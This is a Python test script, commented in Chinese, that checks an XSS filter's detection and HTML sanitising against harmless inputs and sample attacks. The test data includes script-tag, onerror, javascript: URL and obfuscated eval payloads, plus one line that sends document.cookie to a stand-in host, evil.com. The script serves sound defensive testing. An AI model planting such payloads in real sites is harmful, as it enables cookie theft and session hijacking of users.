from pyweb_sec.filters.xss import XSSFilter
from pyweb_sec.utils.config import ConfigManager
from pyweb_sec.utils.logging import SecurityLogger

# 设置
config = ConfigManager()
logger = SecurityLogger(config)
xss_filter = XSSFilter(logger)

# 测试用例
test_cases = [
    # 正常参数
    ("username", "john_doe", False),
    ("comment", "This is a normal comment!", False),
    ("html_content", "This is <b>bold</b> and <i>italic</i> text.", False),
    
    # XSS攻击尝试
    ("username", "<script>alert('XSS')</script>", True),
    ("comment", "Nice site! <img src=\"x\" onerror=\"alert('Hacked!')\">", True),
    ("search", "search term\"; document.location='http://evil.com/steal.php?cookie='+document.cookie; //", True),
    ("content", "<iframe src=\"javascript:alert('XSS')\"></iframe>", True),
    ("data", "javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))", True),
    ("text", "Click <a href=\"javascript:alert('XSS')\">here</a>", True),
    ("input", "<script>setTimeout(function(){alert('Delayed XSS')},1000)</script>", True)
]

# 运行测试
print("=== XSS过滤器测试 ===")
for param_name, param_value, expected_result in test_cases:
    is_xss, pattern = xss_filter.check_parameter(param_name, param_value)
    result = "检测到XSS攻击" if is_xss else "正常参数"
    status = "✓" if is_xss == expected_result else "✗"
    
    print(f"{status} 参数: '{param_name}', 值: '{param_value[:30]}{'...' if len(param_value) > 30 else ''}' => {result}")
    if is_xss:
        print(f"   检测详情: {pattern}")

# 测试HTML内容消毒
print("\n=== HTML消毒测试 ===")
html_samples = [
    "<script>alert('XSS')</script>",
    "Normal text with <b>bold</b> formatting",
    "<a href=\"javascript:alert('click')\">Click me</a>",
    "<img src=\"image.jpg\" onerror=\"alert('error')\">"
]

for html in html_samples:
    sanitized = xss_filter.sanitize_html(html)
    print(f"原始: {html}")
    print(f"消毒后: {sanitized}")
    print()

# 测试请求检查
print("\n=== 请求检查测试 ===")
clean_request = {
    "username": "john",
    "message": "Hello <b>World</b>!",
    "remember": "true"
}

malicious_request = {
    "username": "hacker",
    "message": "<script>alert('XSS');</script>",
    "remember": "true"
}

is_xss, reason = xss_filter.check_request(clean_request)
print(f"正常请求: {'被拦截' if is_xss else '通过'}")

is_xss, reason = xss_filter.check_request(malicious_request)
print(f"恶意请求: {'被拦截' if is_xss else '通过'}")
if is_xss:
    print(f"拦截原因: {reason}")

# 测试参数消毒
print("\n=== 参数消毒测试 ===")
sanitized_params = xss_filter.sanitize_params(malicious_request)
print(f"原始参数: {malicious_request}")
print(f"消毒后参数: {sanitized_params}")